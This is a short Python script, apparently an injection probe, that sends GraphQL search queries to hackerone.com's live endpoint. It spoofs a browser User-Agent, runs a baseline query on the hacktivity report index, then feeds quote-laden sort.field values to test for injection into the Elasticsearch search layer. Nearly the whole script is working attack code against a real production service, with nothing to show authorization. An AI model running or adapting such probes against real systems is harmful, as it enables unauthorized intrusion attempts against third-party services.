# -*- coding: utf-8 -*-
"""T1d:ES 搜索层注入探测 v2(2026-09-08,匿名,无 alias)"""
import requests
import json
import time

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
S = requests.Session()
S.headers.update({"User-Agent": UA})
IDX = "CompleteHacktivityReportIndex"

def gql(query, label, ms=20000):
    try:
        r = S.post("https://hackerone.com/graphql", json={"query": query}, timeout=ms)
        s = r.text
        print(f"== {label}: {r.status_code} {s[:1600]}")
        return s
    except Exception as e:
        print(f"== {label} ERR {e}")
        return None

# 1. 最小 search(基线,无 alias)
gql('{ search(index: %s, query_string: "hackerone", first: 2){ total_count edges{ node{ __typename } } } }' % IDX, "base")

# 2. sort.field 注入(无 alias,一次一个)
for i, f in enumerate(['popularity', 'reported_at', '"', 'popularity"', 'report_id']):
    gql('{ search(index: %s, query_string: "a", sort: { field: %s }, first: 1){ total_count } }' % (IDX, json.dumps(f)), "sort_%d" % i)
    time.sleep(0.3)
